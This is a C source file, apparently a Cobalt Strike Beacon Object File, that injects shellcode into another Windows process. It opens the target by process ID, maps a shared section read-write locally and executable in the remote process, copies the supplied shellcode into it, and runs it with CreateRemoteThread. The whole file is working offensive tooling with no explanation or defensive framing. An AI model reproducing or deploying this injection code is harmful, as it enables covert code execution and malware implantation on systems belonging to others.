#include <stdio.h>
#include <windows.h>
#include "libc.h"

#include "syscalls.c"

#define NT_SUCCESS 0x00000000

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);


void go(char * args, int len) {
    datap parser;
    DWORD procID;
    SIZE_T shellcodeSize = NULL;
    char* shellcode;

    BeaconDataParse(&parser, args, len);
    procID = BeaconDataInt(&parser);
    shellcode = BeaconDataExtract(&parser, &shellcodeSize);

    BeaconPrintf(CALLBACK_OUTPUT, "Size: %d", shellcodeSize);

    HANDLE hLocalProcess = NULL;
    HANDLE hRemoteProcess = NULL;
    HANDLE hSection = NULL;
    HANDLE baseAddrRemote = NULL;
    HANDLE baseAddrLocal = NULL;

    LARGE_INTEGER sectionSize = { shellcodeSize };


    // Local process handle
    hLocalProcess = -1;

    // Remote process handle
    hRemoteProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);

    // Create RWX memory section
    NTSTATUS res = NtCreateSection(&hSection, GENERIC_ALL, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    if(res != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error creating RWX memory section  Aborting...");
        return;
    }
    
    // Map RW Section of Local Process
    NTSTATUS mapStatusLocal = NtMapViewOfSection(hSection, hLocalProcess, &baseAddrLocal, NULL, 0,  NULL, &shellcodeSize, 2, 0, PAGE_READWRITE);

    if(mapStatusLocal != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error mapping local process  Aborting...");
        return;
    }

    // Map view of same section for remote process
    NTSTATUS mapStatusRemote = NtMapViewOfSection(hSection, hRemoteProcess, &baseAddrRemote, NULL, 0, NULL, &shellcodeSize, 2, 0, PAGE_EXECUTE_READ);

    if(mapStatusRemote != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error mapping remote process.  Aborting...");
        return;
    }    

    // Copy buffer to mapped local process
    mycopy(baseAddrLocal, shellcode, shellcodeSize);

    // Unmap local view
    NTSTATUS unmapStatus = NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);

    if(unmapStatus != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error unmapping view");
    }    

    // Close section
    NTSTATUS closeStatus = NtClose(hSection);

    if(closeStatus != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error closing handle");
    } 

    // Create thread
    HANDLE hThread = KERNEL32$CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE) baseAddrRemote, NULL, 0, NULL);
}
